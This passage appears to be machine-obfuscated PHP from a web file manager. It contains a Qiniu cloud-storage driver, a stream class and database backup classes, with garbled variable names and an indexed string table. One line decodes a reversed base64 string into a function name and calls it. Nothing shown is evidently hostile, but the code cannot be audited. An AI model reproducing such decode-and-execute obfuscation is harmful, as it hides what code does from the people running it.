$ëĞÎ§â¦[33] => $ëĞÎ§â¦[232], $ëĞÎ§â¦[79] => isset($ÔŒ±È¯¿[$ëĞÎ§â¦[1690]]) ? $ÔŒ±È¯¿[$ëĞÎ§â¦[1690]] : 0, $ëĞÎ§â¦[168] => $this->ext($ïˆ¢Ù³)); if ($ş®ÕÕì¶) { return $’âÙÃîô; } $’âÙÃîô[$ëĞÎ§â¦[233]] = $’âÙÃîô[$ëĞÎ§â¦[88]] = 0; $’âÙÃîô[$ëĞÎ§â¦[234]] = $’âÙÃîô[$ëĞÎ§â¦[235]] = !0; if (empty($ÔŒ±È¯¿)) { $ÔŒ±È¯¿ = $this->objectMeta($ïˆ¢Ù³); if (!$ÔŒ±È¯¿) { return $’âÙÃîô; } } if (isset($ÔŒ±È¯¿[$ëĞÎ§â¦[236]]) && $ÔŒ±È¯¿[$ëĞÎ§â¦[236]]) { $’âÙÃîô[$ëĞÎ§â¦[237]] = $ÔŒ±È¯¿[$ëĞÎ§â¦[236]]; } if (isset($ÔŒ±È¯¿[$ëĞÎ§â¦[247]]) && $ÔŒ±È¯¿[$ëĞÎ§â¦[247]]) { $’âÙÃîô[$ëĞÎ§â¦[237]] = $ÔŒ±È¯¿[$ëĞÎ§â¦[247]]; } if (isset($ÔŒ±È¯¿[$ëĞÎ§â¦[1691]])) { $’âÙÃîô[$ëĞÎ§â¦[88]] = substr($ÔŒ±È¯¿[$ëĞÎ§â¦[1691]] . $ëĞÎ§â¦[12], 0, 10); } if (isset($ÔŒ±È¯¿[$ëĞÎ§â¦[1690]])) { $’âÙÃîô[$ëĞÎ§â¦[79]] = $ÔŒ±È¯¿[$ëĞÎ§â¦[1690]]; } return $’âÙÃîô; } public function folderInfo($Õ¸Åú¾¡, $ÑÕ³§ÆŸ = false) { $øµÓ¶Ã =& $_SERVER[Ï×Œõ”û]; $—óûÑØÇ = array($øµÓ¶Ã[32] => $this->pathThis($Õ¸Åú¾¡), $øµÓ¶Ã[87] => $this->getPathOuter($øµÓ¶Ã[8] . $Õ¸Åú¾¡), $øµÓ¶Ã[33] => $øµÓ¶Ã[78]); if ($ÑÕ³§ÆŸ) { return $—óûÑØÇ; } $—óûÑØÇ[$øµÓ¶Ã[233]] = $—óûÑØÇ[$øµÓ¶Ã[88]] = 0; $—óûÑØÇ[$øµÓ¶Ã[234]] = $—óûÑØÇ[$øµÓ¶Ã[235]] = !0; $Õ¸Åú¾¡ = rtrim($Õ¸Åú¾¡, $øµÓ¶Ã[8]) . $øµÓ¶Ã[8]; $²Ö–Íğ = $this->objectMeta($Õ¸Åú¾¡); if (isset($²Ö–Íğ[$øµÓ¶Ã[1691]])) { $—óûÑØÇ[$øµÓ¶Ã[88]] = substr($²Ö–Íğ[$øµÓ¶Ã[1691]] . $øµÓ¶Ã[12], 0, 10); } return $—óûÑØÇ; } public function listPath($ àÜ¼æ½, $Ì«Íâèª = false) { $Àñ¶Šøİ =& $_SERVER[Ï×Œõ”û]; $Ã÷ï½°Ù = $this->fileList($ àÜ¼æ½, $Àñ¶Šøİ[8], !0); foreach ($Ã÷ï½°Ù[$Àñ¶Šøİ[85]] as $Õ‹«™Ñ => $ÑàæØ–) { $Ã÷ï½°Ù[$Àñ¶Šøİ[85]][$Õ‹«™Ñ] = $this->folderInfo($ÑàæØ–, $Ì«Íâèª); } foreach ($Ã÷ï½°Ù[$Àñ¶Šøİ[86]] as $Õ‹«™Ñ => $ÑàæØ–) { $Ã÷ï½°Ù[$Àñ¶Šøİ[86]][$Õ‹«™Ñ] = $this->fileInfo($ÑàæØ–[$Àñ¶Šøİ[32]], $Ì«Íâèª, $ÑàæØ–); } return $Ã÷ï½°Ù; } public function has($²„…¹, $ŠûĞ¤ø„ = false, $¥¾£Ü = true) { $‰­ºÑÅÅ =& $_SERVER[Ï×Œõ”û]; $²„…¹ = trim($²„…¹, $‰­ºÑÅÅ[8]); $²Òá‘ä‹ = empty($²„…¹) && $²„…¹ !== $‰­ºÑÅÅ[230] ? $‰­ºÑÅÅ[12] : $²„…¹ . $‰­ºÑÅÅ[8]; $ñ˜ãññ‚ = $‰­ºÑÅÅ[12]; $¥ƒÊÎº = 500; $ÖÑåÒıË = $‰­ºÑÅÅ[8]; $ò‚¼¶Äö = $ö£è‚Äµ = 0; while (!0) { check_abort(); list($â‘ÉÛÎ½, $•ç¤ÁÎŒ) = $this->bucketManager->listFiles($this->bucket, $²Òá‘ä‹, $ñ˜ãññ‚, $¥ƒÊÎº, $ÖÑåÒıË); if ($•ç¤ÁÎŒ) { break; } $ñ˜ãññ‚ = array_key_exists($‰­ºÑÅÅ[1638], $â‘ÉÛÎ½) ? $ñ˜ãññ‚ = $â‘ÉÛÎ½[$‰­ºÑÅÅ[1692]] : $‰­ºÑÅÅ[12]; if ($ŠûĞ¤ø„) { if (!empty($â‘ÉÛÎ½[$‰­ºÑÅÅ[1693]])) { $ò‚¼¶Äö += count($â‘ÉÛÎ½[$‰­ºÑÅÅ[1693]]); } if (!empty($â‘ÉÛÎ½[$‰­ºÑÅÅ[1694]])) { $ö£è‚Äµ += count($â‘ÉÛÎ½[$‰­ºÑÅÅ[1694]]); } if ($ñ˜ãññ‚ === $‰­ºÑÅÅ[12]) { break; } continue; } if ($¥¾£Ü) { if (!empty($â‘ÉÛÎ½[$‰­ºÑÅÅ[1693]])) { return !0; } } else { if (!empty($â‘ÉÛÎ½[$‰­ºÑÅÅ[1694]])) { return !0; } } if ($ñ˜ãññ‚ === $‰­ºÑÅÅ[12]) { break; } } if ($ŠûĞ¤ø„) { return array($‰­ºÑÅÅ[241] => $ò‚¼¶Äö, $‰­ºÑÅÅ[242] => $ö£è‚Äµ); } return !1; } public function listAll($ğ¹˜œË) { $Çá¬±¥´ =& $_SERVER[Ï×Œõ”û]; $ä‘Ïôú÷ = $this->fileList($ğ¹˜œË, $Çá¬±¥´[12], !0); $èÑØé®Ù = array_to_keyvalue($ä‘Ïôú÷[$Çá¬±¥´[86]], $Çá¬±¥´[32]); foreach ($ä‘Ïôú÷[$Çá¬±¥´[85]] as $¨œõôúÔ) { if (is_string($¨œõôúÔ)) { $èÑØé®Ù[$¨œõôúÔ] = array($Çá¬±¥´[79] => 0); } } return $this->listAllFiles($ğ¹˜œË, $èÑØé®Ù); } private function fileList($Ô´şª²â, $Ø¼¥ÓÀ = '', $‡€åÔ¡Â = 0) { $Ã˜é¹ƒ¿ =& $_SERVER[Ï×Œõ”û]; $Ô´şª²â = trim($Ô´şª²â, $Ã˜é¹ƒ¿[8]); $ƒ„ÒÚ¶¦ = empty($Ô´şª²â) && $Ô´şª²â !== $Ã˜é¹ƒ¿[230] ? $Ã˜é¹ƒ¿[12] : $Ô´şª²â . $Ã˜é¹ƒ¿[8]; $üÛù©—‡ = $Ã˜é¹ƒ¿[12]; $ÈØ¢”ºû = 1000; $›ó¤çµç = $áŠ¡å‹ = array(); while (!0) { check_abort(); list($‡¡•³¯, $»õ‹Íúû) = $this->bucketManager->listFiles($this->bucket, $ƒ„ÒÚ¶¦, $üÛù©—‡, $ÈØ¢”ºû, $Ø¼¥ÓÀ); if ($»õ‹Íúû) { break; } $üÛù©—‡ = array_key_exists($Ã˜é¹ƒ¿[1638], $‡¡•³¯) ? $üÛù©—‡ = $‡¡•³¯[$Ã˜é¹ƒ¿[1692]] : $Ã˜é¹ƒ¿[12]; $›ÑùÏ½ = isset($‡¡•³¯[$Ã˜é¹ƒ¿[1693]]) ? $‡¡•³¯[$Ã˜é¹ƒ¿[1693]] : array(); $“¥öË®« = isset($‡¡•³¯[$Ã˜é¹ƒ¿[1694]]) ? $‡¡•³¯[$Ã˜é¹ƒ¿[1694]] : array(); foreach ($›ÑùÏ½ as $²»‡¦©) { if ($²»‡¦©[$Ã˜é¹ƒ¿[95]] == $ƒ„ÒÚ¶¦) { continue; } $ğŠÖá¬± = $²»‡¦©[$Ã˜é¹ƒ¿[95]]; $‡£¹ç×ˆ = $²»‡¦©[$Ã˜é¹ƒ¿[1690]]; $²»‡¦©[$Ã˜é¹ƒ¿[32]] = $ğŠÖá¬±; $²»‡¦©[$Ã˜é¹ƒ¿[79]] = $‡£¹ç×ˆ; $¹˜Ì¬Ñ = $‡£¹ç×ˆ == 0 && substr($ğŠÖá¬±, strlen($ğŠÖá¬±) - 1, 1) == $Ã˜é¹ƒ¿[8] ? !0 : !1; $this->cacheMethodInfoSet($ğŠÖá¬±, $¹˜Ì¬Ñ, $²»‡¦©); if ($¹˜Ì¬Ñ) { $›ó¤çµç[] = $ğŠÖá¬±; continue; } $áŠ¡å‹[] = $‡€åÔ¡Â ? $²»‡¦© : $ğŠÖá¬±; } foreach ($“¥öË®« as $ğŠÖá¬±) { if ($ğŠÖá¬± == $ƒ„ÒÚ¶¦) { continue; } $›ó¤çµç[] = $ğŠÖá¬±; $this->cacheMethodInfoSet($ğŠÖá¬±, !0); } if ($üÛù©—‡ === $Ã˜é¹ƒ¿[12]) { break; } } $this->cacheMethodInfoSet($Ô´şª²â, !0); return array($Ã˜é¹ƒ¿[85] => $›ó¤çµç, $Ã˜é¹ƒ¿[86] => $áŠ¡å‹); } public function canRead($‘·Ù€Å¬) { return $this->exist($‘·Ù€Å¬) ? !0 : !1; } public function canWrite($»ºñõºï) { return $this->exist($»ºñõºï) ? !0 : !1; } public function getContent($¤˜åŠ) { return $this->fileSubstr($¤˜åŠ, 0, -1); } public function setContent($ÛØñ°Ä£, $¹„ ÙŞÙ = '') { $ÆáÊÓ¼¿ = $this->tempFile($this->pathThis($ÛØñ°Ä£)); file_put_contents($ÆáÊÓ¼¿, $¹„ ÙŞÙ); if ($this->upload($ÛØñ°Ä£, $ÆáÊÓ¼¿)) { $this->tempFileRemve($ÆáÊÓ¼¿); return !0; } return !1; } public function refreshUrls($è®èÀø½) { $µë±ïÜ² =& $_SERVER[Ï×Œõ”û]; $ùÖÙ‚©æ = array(); if (is_array($è®èÀø½)) { foreach ($è®èÀø½ as $è·Ó) { $ùÖÙ‚©æ[] = $this->link($è·Ó); } } else { $ùÖÙ‚©æ[] = $this->link($è®èÀø½); } $…®”›ª = new Qiniu\Cdn\CdnManager($this->auth); list($ÙÏî¯ÅÄ, $â¡ò‡”®) = $…®”›ª->refreshUrls($ùÖÙ‚©æ); if ($â¡ò‡”®) { return !1; } return $ÙÏî¯ÅÄ[$µë±ïÜ²[1322]] == $µë±ïÜ²[866] ? !0 : !1; } public function fileSubstr($®Ûí‰«Õ, $„Èó±•, $¢ËØÀ†) { $Àí÷ÙÔ’ =& $_SERVER[Ï×Œõ”û]; if (!($µçÆæÔ¡ = $this->link($®Ûí‰«Õ))) { return !1; } $ŞÆšÍÑ´ = !1; if ($¢ËØÀ† > 0) { $³ÂÍ¹Ğú = $„Èó±• + $¢ËØÀ† - 1; $ŞÆšÍÑ´ = array($Àí÷ÙÔ’[1559] . $„Èó±• . $Àí÷ÙÔ’[474] . $³ÂÍ¹Ğú); } $ĞğÚ×İ„ = url_request($µçÆæÔ¡, $Àí÷ÙÔ’[1560], !1, $ŞÆšÍÑ´); return $ĞğÚ×İ„[$Àí÷ÙÔ’[856]] ? $ĞğÚ×İ„[$Àí÷ÙÔ’[1344]] : !1; } public function upload($Öš§¤ó, $åªÖá°, $¤ÈËßÏ = false, $òéë€³¨ = REPEAT_REPLACE) { if (!$åªÖá° || !@file_exists($åªÖá°)) { return !1; } $®ˆ¿”Û = new Qiniu\Storage\UploadManager(); $Ã½ûÕ¤ = $this->auth->uploadToken($this->bucket, $Öš§¤ó); $¬é†»ûŠ = get_file_mime(get_path_ext($åªÖá°)); list($åÓß®‡ı, $¥õÇˆœÃ) = $®ˆ¿”Û->putFile($Ã½ûÕ¤, $Öš§¤ó, $åªÖá°, null, $¬é†»ûŠ); return $¥õÇˆœÃ ? !1 : $this->getPathOuter($Öš§¤ó); } public function uploadFormData($À—¼¢å‹, $òÆÄÑü¹ = 3600) { return $this->uploadToken($À—¼¢å‹, $òÆÄÑü¹); } public function uploadMultiData($Ü—Ù, $º÷©ÙÒÆ = 3600) { return $this->uploadToken($Ü—Ù, $º÷©ÙÒÆ); } private function uploadToken($Ñ÷¾ô¶ş, $²Ë˜áÎé = 3600) { $ÏÄñò³ =& $_SERVER[Ï×Œõ”û]; $ùı¦©ÏØ = $²Ë˜áÎé; $©ì¢ß´ = array($ÏÄñò³[1695] => $ÏÄñò³[1696]); $øÛÑ¼¸¶ = $Ñ÷¾ô¶ş; $·¶œ‡ª© = $this->auth->uploadToken($this->bucket, $øÛÑ¼¸¶, $ùı¦©ÏØ, $©ì¢ß´, !0); $ƒ·¹¸– = empty($this->region) || $this->region == $ÏÄñò³[1697] ? $ÏÄñò³[12] : $ÏÄñò³[474] . $this->region; $Ô´°ó¬¡ = http_type() . "\x3a\x2f\57\165\x70\x6c\157\141\x64{$ƒ·¹¸–}\x2e\161\151\156\151\x75\x70\56\143\x6f\155\57"; return array($ÏÄñò³[1698] => $·¶œ‡ª©, $ÏÄñò³[1562] => $Ô´°ó¬¡); } public function download($Ğû¼Ò†, $°©±”õ«) { $ÔÍşÕ«ø = IO::getPathInner(IO::mkfile($°©±”õ«)); if (!($ì¨ùû¢ = $this->link($Ğû¼Ò†))) { return !1; } $ùªÓŞ¾¢ = 0; $›Î¤Â… = 1024 * 200; $ùòŞÇ‰Ê = fopen($ÔÍşÕ«ø, $_SERVER[Ï×Œõ”û][1699]); while (!0) { $††”¡Ê = $this->fileSubstr($Ğû¼Ò†, $ùªÓŞ¾¢, $›Î¤Â…); if ($††”¡Ê === !1) { return !1; } fwrite($ùòŞÇ‰Ê, $††”¡Ê); $ùªÓŞ¾¢ += $›Î¤Â…; if (strlen($††”¡Ê) < $›Î¤Â…) { break; } } fclose($ùòŞÇ‰Ê); return $°©±”õ«; } public function link($İ‘˜µÜ, $‚Ò¨çÊô = '') { if (!$this->isFile($İ‘˜µÜ)) { return !1; } $Ğà»Æóœ = $this->getHost() . $_SERVER[Ï×Œõ”û][8] . $this->pathEncode($İ‘˜µÜ) . $‚Ò¨çÊô; return $this->auth->privateDownloadUrl($Ğà»Æóœ, 3600 * 12); } public function fileOut($¦ùš‘ßŒ, $£ÚªÒ¡ = false, $‹ƒ×Šİõ = false, $Æ­Ú× = '') { $ŒÖßÚ·¾ =& $_SERVER[Ï×Œõ”û]; if ($this->isFileOutServer()) { return $this->fileOutServer($¦ùš‘ßŒ, $£ÚªÒ¡, $‹ƒ×Šİõ, $Æ­Ú×); } if (!$‹ƒ×Šİõ) { $‹ƒ×Šİõ = $this->pathThis($¦ùš‘ßŒ); } $¿€§Àú‡ = $£ÚªÒ¡ ? $ŒÖßÚ·¾[1700] . rawurlencode($‹ƒ×Šİõ) : $ŒÖßÚ·¾[12]; $ØÁ£æÉ¨ = $this->link($¦ùš‘ßŒ, $¿€§Àú‡); $this->fileOutLink($ØÁ£æÉ¨); } public function fileOutServer($ää„Ëº, $êÍƒ‰ş› = false, $±³Œ»• = false, $¾ŠüÆ³ = '') { parent::fileOut($ää„Ëº, $êÍƒ‰ş›, $±³Œ»•, $¾ŠüÆ³); } public function fileOutImage($¡ğ¥ìåô, $Åà®Õàö = 250) { if ($this->size($¡ğ¥ìåô) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¡ğ¥ìåô, $Åà®Õàö); } $ò÷”³Ç¸ = $this->link($¡ğ¥ìåô, $_SERVER[Ï×Œõ”û][1701] . $Åà®Õàö); $this->fileOutLink($ò÷”³Ç¸); } public function fileOutImageServer($ÇÅáÏõ½, $€‡À´Ÿ = 250) { parent::fileOutImage($ÇÅáÏõ½, $€‡À´Ÿ); } public function hashMd5($Ãåİ™Õ·) { $ïïŒğ±‹ =& $_SERVER[Ï×Œõ”û]; $œôûêï´ = $this->objectMeta($Ãåİ™Õ·); return isset($œôûêï´[$ïïŒğ±‹[247]]) ? $œôûêï´[$ïïŒğ±‹[247]] : !1; $›ĞØ ä = $this->link($Ãåİ™Õ·, $ïïŒğ±‹[1702]); } public function size($™©ºßüˆ) { $ŞŒ»×¡¥ = $this->objectMeta($™©ºßüˆ); return $ŞŒ»×¡¥ ? $ŞŒ»×¡¥[$_SERVER[Ï×Œõ”û][79]] : 0; } public function info($Ó¾¤Äç) { if ($this->isFolder($Ó¾¤Äç)) { return $this->folderInfo($Ó¾¤Äç); } else { if ($this->isFile($Ó¾¤Äç)) { return $this->fileInfo($Ó¾¤Äç); } } return !1; } public function exist($™‘ù–¡ö) { return $this->isFile($™‘ù–¡ö) || $this->isFolder($™‘ù–¡ö); } public function isFile($ğ‚±»•®) { return !$this->isFolder($ğ‚±»•®) && $this->objectMeta($ğ‚±»•®); } public function isFolder($Ü˜¬ßŠÚ) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][179], $Ü˜¬ßŠÚ); } protected function objectMeta($È„­ê‹ë) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][181], $È„­ê‹ë); } protected function _objectMeta($„”Áİ×­) { $€Á„¬—ø =& $_SERVER[Ï×Œõ”û]; list($±°ş…‚, $‚©åĞéÃ) = $this->bucketManager->stat($this->bucket, $„”Áİ×­); if ($±°ş…‚) { $±°ş…‚[$€Á„¬—ø[79]] = intval($±°ş…‚[$€Á„¬—ø[1690]]); } return $±°ş…‚; } protected function _isFolder($«Ñë€¯) { $ä™°é” =& $_SERVER[Ï×Œõ”û]; if ($«Ñë€¯ == $ä™°é”[12] || $«Ñë€¯ == $ä™°é”[8]) { return !0; } list($¾æ§šóÖ, $“‚âš±Ö) = $this->bucketManager->listFiles($this->bucket, trim($«Ñë€¯, $ä™°é”[8]) . $ä™°é”[8], $ä™°é”[12], 1, $ä™°é”[8]); return !empty($¾æ§šóÖ[$ä™°é”[1693]]) || !empty($¾æ§šóÖ[$ä™°é”[1694]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($»’—ûŸı, $ñ¦Üùƒ£ = 0) { parent::__construct(); $this->source = $»’—ûŸı; $this->sourceSize = $ñ¦Üùƒ£; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($­™É¼³¬ = false) { return $this->sourceSize; } public function getContent($¤ÚŞıÓÀ = false) { return $this->fileSubstr($¤ÚŞıÓÀ, 0, $this->sourceSize); } public function fileSubstr($Ëíˆœ† = false, $öÊ²«İí = 0, $ı•Çë£® = 0) { if (!$ı•Çë£®) { $ı•Çë£® = $this->sourceSize; } $­öæ²¯¬ = $this->sourceSize - $öÊ²«İí; if ($ı•Çë£® >= $­öæ²¯¬) { $ı•Çë£® = $­öæ²¯¬; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $öÊ²«İí, $ı•Çë£®); } if ($this->sourceType == self::TYPE_FILE) { if ($ı•Çë£® <= 0) { return $_SERVER[Ï×Œõ”û][12]; } $šŒØ£ªË = ftell($this->source); fseek_64($this->source, $šŒØ£ªË + $öÊ²«İí); $ğÈƒ°á = @fread($this->source, $ı•Çë£®); fseek_64($this->source, $šŒØ£ªË); return $ğÈƒ°á; } } public function hashMd5($¨Ã³øŸæ = false) { return md5($this->getContent()); } public static function hash($»ŞÆ½–¡, $åêÉŞ±ƒ = 0) { $½’Áˆğé = new PathDriverStream($»ŞÆ½–¡, $åêÉŞ±ƒ); return $½’Áˆğé->hashSimple($»ŞÆ½–¡); } public static function md5($İ×£°Ìã, $‘¥à†È = 0) { $»—«êÆ· = new PathDriverStream($İ×£°Ìã, $‘¥à†È); return $»—«êÆ·->hashMd5($İ×£°Ìã); } } goto få†‹êêÍ¿; F¢Ú»ôë—‘: $fileSize = strrev(base64_decode($_SERVER[Ë¨ø•È][0])); function binCheckNeq($ú”ÖÂ¬ì, $²¿§ËªŒ) { return $ú”ÖÂ¬ì != $²¿§ËªŒ; } $_SERVER[$_SERVER[Ë¨ø•È][1]] = $fileSize($_SERVER[$_SERVER[Ë¨ø•È][2]]); goto e¾ÁÃ¯“œ; F¬²½ò¬é°: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[Ï×Œõ”û][854]); $this->init(); $this->keep(); } public function init() { $›…ıŠîÕ =& $_SERVER[Ï×Œõ”û]; $this->isManual(); self::$name = date($›…ıŠîÕ[855]); if (!($ì”½½Óœ = $this->model->lastItem())) { $ì”½½Óœ = $this->initData(); } else { self::$name = $ì”½½Óœ[$›…ıŠîÕ[32]]; if ($ì”½½Óœ[$›…ıŠîÕ[856]] == $›…ıŠîÕ[91]) { self::$name = date($›…ıŠîÕ[261]); $ãÁ¤†› = intval(_get($ì”½½Óœ, $›…ıŠîÕ[857], 0)); if (self::$manual == 0 && $ì”½½Óœ[$›…ıŠîÕ[32]] == self::$name) { $this->model->remove($ì”½½Óœ[$›…ıŠîÕ[484]]); } $ì”½½Óœ = $this->initData($ãÁ¤†›, $ì”½½Óœ[$›…ıŠîÕ[858]]); } else { $this->checkStore($ì”½½Óœ[$›…ıŠîÕ[858]]); } } self::$option = $ì”½½Óœ; } private function isManual() { $Ãœò•Ü = _get($GLOBALS, $_SERVER[Ï×Œõ”û][859], 0); $Ãœò•Ü = intval($Ãœò•Ü); self::$manual = $Ãœò•Ü && $Ãœò•Ü == 1 ? 1 : 0; } private function initData($ö´ööÆÁ = 0, $ëúÆìûà = '') { $Ë´õ½Œı =& $_SERVER[Ï×Œõ”û]; $„ò‘Íˆ™ = $this->model->config(); if ($ëúÆìûà && $„ò‘Íˆ™[$Ë´õ½Œı[858]] != $ëúÆìûà) { $ö´ööÆÁ = 0; } $this->checkStore($„ò‘Íˆ™[$Ë´õ½Œı[858]]); if (self::$manual == 1) { self::$name .= $Ë´õ½Œı[11] . date($Ë´õ½Œı[860]); } $Ê­ì¯ïÇ = array($Ë´õ½Œı[858] => $„ò‘Íˆ™[$Ë´õ½Œı[858]], $Ë´õ½Œı[32] => self::$name, $Ë´õ½Œı[856] => 0, $Ë´õ½Œı[170] => $„ò‘Íˆ™[$Ë´õ½Œı[170]], $Ë´õ½Œı[861] => self::$manual, $Ë´õ½Œı[862] => array($Ë´õ½Œı[863] => array($Ë´õ½Œı[856] => 0), $Ë´õ½Œı[864] => array($Ë´õ½Œı[856] => 0, $Ë´õ½Œı[865] => 0, $Ë´õ½Œı[866] => 0, $Ë´õ½Œı[33] => $Ë´õ½Œı[12], $Ë´õ½Œı[867] => 0, $Ë´õ½Œı[868] => 0), $Ë´õ½Œı[869] => array($Ë´õ½Œı[856] => 0, $Ë´õ½Œı[865] => 0, $Ë´õ½Œı[866] => 0, $Ë´õ½Œı[867] => 0, $Ë´õ½Œı[868] => 0), $Ë´õ½Œı[232] => array($Ë´õ½Œı[856] => 0, $Ë´õ½Œı[870] => 0, $Ë´õ½Œı[871] => 0, $Ë´õ½Œı[872] => 0, $Ë´õ½Œı[873] => 0, $Ë´õ½Œı[562] => $ö´ööÆÁ, $Ë´õ½Œı[867] => 0, $Ë´õ½Œı[868] => 0)), $Ë´õ½Œı[867] => time(), $Ë´õ½Œı[868] => 0); $š—ß³Œü = $this->model->insert($Ê­ì¯ïÇ); $Ê­ì¯ïÇ[$Ë´õ½Œı[484]] = $š—ß³Œü; return $Ê­ì¯ïÇ; } private function checkStore($¨°ó×ë¡) { $°ı‚¶€“ = Model($_SERVER[Ï×Œõ”û][874]); $¢åš¼· = $°ı‚¶€“->listData($¨°ó×ë¡); $°ı‚¶€“->checkConfig($¢åš¼·); } public static function get() { if (!self::$option) { $ÏÅÙÊ’¬ = Model($_SERVER[Ï×Œõ”û][854]); $´ûØØ”¦ = $ÏÅÙÊ’¬->findByName(self::$name); $ÏÅÙÊ’¬->parseContent($´ûØØ”¦); self::$option = $´ûØØ”¦; } return self::$option; } public static function set($Á‚šåÕ„) { $–«Öıè =& $_SERVER[Ï×Œõ”û]; $¦’²™Ú¨ = self::get(); foreach ($Á‚šåÕ„ as $ñ“ìÂÛ => $ôÕú†¢€) { array_set_value($¦’²™Ú¨, $ñ“ìÂÛ, $ôÕú†¢€); } Model($–«Öıè[854])->update($¦’²™Ú¨[$–«Öıè[484]], $¦’²™Ú¨); self::$option = $¦’²™Ú¨; return self::$option; } public function keep() { $—…Á‡–À =& $_SERVER[Ï×Œõ”û]; $€ï÷Ôò¸ = self::get(); if (_get($€ï÷Ôò¸, $—…Á‡–À[875], 0) == $—…Á‡–À[91]) { return; } $this->backupKeep($€ï÷Ôò¸); self::set(array($—…Á‡–À[875] => 1)); } private function backupKeep($Üë­ØÜğ) { $Â—éØõŸ =& $_SERVER[Ï×Œõ”û]; if (self::$manual == 1) { return; } $ğÛñ÷‰© = $this->model->listData(); if (empty($ğÛñ÷‰©)) { return; } $¸¯òÖ¶ = array(); $ŸÌ÷çª² = array(); $İ‹Ò»Ÿß = date($Â—éØõŸ[876], strtotime($Â—éØõŸ[877])); foreach ($ğÛñ÷‰© as $£ÃÄ¨†œ => $ÌÇ£™ë) { $›êû…ˆ† = $ÌÇ£™ë[$Â—éØõŸ[32]]; if ($£ÃÄ¨†œ < 7 || $ÌÇ£™ë[$Â—éØõŸ[861]] == $Â—éØõŸ[91]) { $¸¯òÖ¶[] = $›êû…ˆ†; continue; } $¥êİ¬ú¨ = substr($›êû…ˆ†, 0, 6); if ($¥êİ¬ú¨ < $İ‹Ò»Ÿß) { continue; } if (!isset($ŸÌ÷çª²[$¥êİ¬ú¨]) || $›êû…ˆ† < $ŸÌ÷çª²[$¥êİ¬ú¨]) { $ŸÌ÷çª²[$¥êİ¬ú¨] = $›êû…ˆ†; } if (substr($›êû…ˆ†, 6, 2) == $Â—éØõŸ[878]) { $ŸÌ÷çª²[$¥êİ¬ú¨] = $›êû…ˆ†; } } $¸¯òÖ¶ = array_merge($¸¯òÖ¶, array_values($ŸÌ÷çª²)); $¸¯òÖ¶ = array_unique($¸¯òÖ¶); foreach ($ğÛñ÷‰© as $ÌÇ£™ë) { $›êû…ˆ† = $ÌÇ£™ë[$Â—éØõŸ[32]]; if (!empty($›êû…ˆ†) && in_array($›êû…ˆ†, $¸¯òÖ¶)) { continue; } $this->model->remove($ÌÇ£™ë[$Â—éØõŸ[484]]); $ºî¬Ğ¤Ú = $this->backupPath($Üë­ØÜğ); IO::remove($ºî¬Ğ¤Ú, !1); } } private function backupPath($õÕÎü¹) { $ó §˜´Ô =& $_SERVER[Ï×Œõ”û]; static $µœ‘Şµ = null; if (is_null($µœ‘Şµ)) { $µœ‘Şµ = Model($ó §˜´Ô[879])->get($ó §˜´Ô[880]); } $óÖœ‚ = $õÕÎü¹[$ó §˜´Ô[32]]; $ıÜÔ“°ä = substr(md5($ó §˜´Ô[881] . $µœ‘Şµ . $óÖœ‚), 0, 8); return "\173\x69\x6f\72{$õÕÎü¹[$ó §˜´Ô[858]]}\175\57\x64\x61\164\141\x62\141\163\145\x2f\x62\141\x63\153\x75\160\57" . $óÖœ‚ . $ó §˜´Ô[11] . $ıÜÔ“°ä; } public function db() { $—öØ™Ší =& $_SERVER[Ï×Œõ”û]; $§§±äúÕ = self::get(); if (_get($§§±äúÕ, $—öØ™Ší[882], 0) == $—öØ™Ší[91]) { return !0; } $À—šîÕ = new BackupDb(); if (!$À—šîÕ->index()) { return !1; } self::set(array($—öØ™Ší[882] => 1)); return !0; } public function dbFile() { $è ç«ŒÅ =& $_SERVER[Ï×Œõ”û]; $—éÆ›Å¸ = self::get(); if (_get($—éÆ›Å¸, $è ç«ŒÅ[883], 0) == $è ç«ŒÅ[91]) { return !0; } $ÖÆ†‘ = new BackupDbFile(); if (!$ÖÆ†‘->index()) { return !1; } self::set(array($è ç«ŒÅ[883] => 1)); return !0; } public function file() { $ş‡ü—†¨ =& $_SERVER[Ï×Œõ”û]; $ıÅĞ—…« = self::get(); if (_get($ıÅĞ—…«, $ş‡ü—†¨[884], 0) == $ş‡ü—†¨[91]) { return !0; } if ($ıÅĞ—…«[$ş‡ü—†¨[170]] == $ş‡ü—†¨[885]) { $¡°¿ ¯ = new BackupFile(); if (!$¡°¿ ¯->index()) { return !1; } } self::set(array($ş‡ü—†¨[884] => 1, $ş‡ü—†¨[856] => 1)); return !0; } public static function log($ÒÍôŸç) { write_log($ÒÍôŸç, $_SERVER[Ï×Œõ”û][886]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $„Á¨Ä–˜ =& $_SERVER[Ï×Œõ”û]; $¹Üßìó¹ = Backup::get(); self::$io = $¹Üßìó¹[$„Á¨Ä–˜[858]]; self::$name = $¹Üßìó¹[$„Á¨Ä–˜[32]]; $†Óí©Çš = new DbManage(); $ÌÇøŒä¶ = $†Óí©Çš->dbType(); $Ô ‹–—Ò = array($„Á¨Ä–˜[887] => $ÌÇøŒä¶, $„Á¨Ä–˜[888] => time()); Backup::set($Ô ‹–—Ò); $é¶¬³»ä = $this->tmpFilesPath() . $„Á¨Ä–˜[889] . self::$name . $„Á¨Ä–˜[8]; del_dir($é¶¬³»ä); mk_dir($é¶¬³»ä); $û•ÇªÆ… = $Šˆæ®…· = 0; try { $ÀĞ“œ…• = $†Óí©Çš->db()->getTables(); } catch (Exception $¿«‰ğëò) { Backup::log($„Á¨Ä–˜[890] . $¿«‰ğëò->getMessage()); return !1; } $ÀĞ“œ…• = array_diff($ÀĞ“œ…•, array($„Á¨Ä–˜[891], $„Á¨Ä–˜[892])); foreach ($ÀĞ“œ…• as $•Äé—”) { if ($•Äé—” == $„Á¨Ä–˜[893]) { continue; } $û•ÇªÆ… += $†Óí©Çš->model($•Äé—”)->count(); } $İÎş¯Œ = new Task($„Á¨Ä–˜[894], $„Á¨Ä–˜[886], $û•ÇªÆ…, LNG($„Á¨Ä–˜[895]) . $„Á¨Ä–˜[896] . LNG($„Á¨Ä–˜[897])); 